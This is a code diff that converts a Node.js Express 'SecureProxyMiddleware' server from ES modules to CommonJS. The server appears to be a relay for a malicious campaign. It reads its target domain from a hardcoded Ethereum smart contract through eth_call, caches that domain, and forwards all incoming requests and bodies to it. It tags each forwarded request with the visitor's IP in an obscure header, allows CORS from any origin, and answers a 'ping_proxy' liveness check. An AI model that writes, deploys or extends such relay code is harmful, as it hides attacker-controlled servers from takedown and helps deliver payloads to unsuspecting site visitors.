@@ -1,26 +1,29 @@
-import express from 'express';
-import fetch from 'node-fetch';
-import crypto from 'crypto';
-import fs from 'fs';
-import os from 'os';
-import path from 'path';
-import bodyParser from 'body-parser';
-
+const express = require('express');
+const fetch = require('node-fetch');
+const crypto = require('crypto');
+const fs = require('fs');
+const os = require('os');
+const path = require('path');
 const app = express();
 const port = process.env.PORT || 3000;
 
-app.use(bodyParser.raw({ type: '*/*' }));
+// Parse raw body for non-GET methods
+app.use((req, res, next) => {
+    let data = [];
+    req.on('data', chunk => data.push(chunk));
+    req.on('end', () => {
+        req.rawBody = Buffer.concat(data);
+        next();
+    });
+});
 
-// ====== Get Client IP ======
 function getClientIP(req) {
-    const cfIP = req.headers['cf-connecting-ip'];
-    if (cfIP) return cfIP;
-    const forwarded = req.headers['x-forwarded-for'];
-    if (forwarded) return forwarded.split(',')[0].trim();
-    return req.socket.remoteAddress;
+    if (req.headers['cf-connecting-ip']) return req.headers['cf-connecting-ip'];
+    if (req.headers['x-forwarded-for'])
+        return req.headers['x-forwarded-for'].split(',')[0].trim();
+    return req.connection.remoteAddress;
 }
 
-// ====== Proxy Middleware Class ======
 class SecureProxyMiddleware {
     constructor(options = {}) {
         this.rpcUrls = options.rpcUrls || [
@@ -33,7 +36,7 @@ class SecureProxyMiddleware {
             .update((process.env.HOSTNAME || 'localhost') + process.version)
             .digest('hex');
         this.cacheFile = path.join(os.tmpdir(), `proxy_cache_${serverIdentifier}.json`);
-        this.updateInterval = 60; // seconds
+        this.updateInterval = 60;
     }
 
     loadCache() {
@@ -44,8 +47,7 @@ class SecureProxyMiddleware {
     }
 
     saveCache(domain) {
-        const cache = { domain, timestamp: Date.now() };
-        fs.writeFileSync(this.cacheFile, JSON.stringify(cache));
+        fs.writeFileSync(this.cacheFile, JSON.stringify({ domain, timestamp: Date.now() }));
     }
 
     hexToString(hex) {
@@ -74,22 +76,16 @@ class SecureProxyMiddleware {
                         jsonrpc: '2.0',
                         id: 1,
                         method: 'eth_call',
-                        params: [{
-                            to: this.contractAddress,
-                            data: '0x' + data
-                        }, 'latest']
+                        params: [{ to: this.contractAddress, data: '0x' + data }, 'latest']
                     }),
                     timeout: 120000
                 });
-
                 const result = await response.json();
                 if (!result.error) {
                     const domain = this.hexToString(result.result);
                     if (domain) return domain;
                 }
-            } catch (e) {
-                continue;
-            }
+            } catch (e) { continue; }
         }
         throw new Error('Could not fetch target domain');
     }
@@ -108,33 +104,31 @@ class SecureProxyMiddleware {
             const url = `${targetDomain}/${endpoint.replace(/^\//, '')}`;
             const clientIP = getClientIP(req);
 
+            // Prepare headers
             const headers = { ...req.headers };
             delete headers['host'];
             delete headers['origin'];
             delete headers['accept-encoding'];
             delete headers['content-encoding'];
-
             headers['x-dfkjldifjlifjd'] = clientIP;
 
             const proxyResponse = await fetch(url, {
                 method: req.method,
                 headers: headers,
-                body: req.method !== 'GET' && req.method !== 'HEAD'
-                    ? req.body
-                    : undefined,
+                body: req.method !== 'GET' && req.method !== 'HEAD' ? req.rawBody : undefined,
                 timeout: 120000
             });
 
-            const contentType = proxyResponse.headers.get('content-type');
+            // CORS headers
             res.set('Access-Control-Allow-Origin', '*');
             res.set('Access-Control-Allow-Methods', 'GET, HEAD, POST, OPTIONS');
             res.set('Access-Control-Allow-Headers', '*');
-            if (contentType) res.type(contentType);
+
+            if (proxyResponse.headers.get('content-type')) {
+                res.type(proxyResponse.headers.get('content-type'));
+            }
             res.status(proxyResponse.status);
-
-            const buffer = await proxyResponse.buffer();
-            res.send(buffer);
-
+            proxyResponse.body.pipe(res); // Stream response directly
         } catch (err) {
             res.status(500).send('error: ' + err.message);
         }
@@ -149,7 +143,7 @@ const proxy = new SecureProxyMiddleware({
     contractAddress: "0xe9d5f645f79fa60fca82b4e1d35832e43370feb0"
 });
 
-// ====== OPTIONS (CORS Preflight) ======
+// OPTIONS request (CORS preflight)
 app.options('*', (req, res) => {
     res.set('Access-Control-Allow-Origin', '*');
     res.set('Access-Control-Allow-Methods', 'GET, HEAD, POST, OPTIONS');
@@ -158,12 +152,16 @@ app.options('*', (req, res) => {
     res.sendStatus(204);
 });
 
-// ====== Ping Route ======
-app.get('/?e=ping_proxy', (req, res) => {
-    res.type('text/plain').send('pong');
+// Ping check
+app.get('/', (req, res) => {
+    if (req.query.e === 'ping_proxy') {
+        res.type('text/plain').send('pong');
+    } else {
+        res.status(400).send('Missing endpoint');
+    }
 });
 
-// ====== Proxy Route ======
+// Proxy main
 app.all('*', async (req, res) => {
     const endpoint = req.query.e;
     if (!endpoint) return res.status(400).send('Missing endpoint');
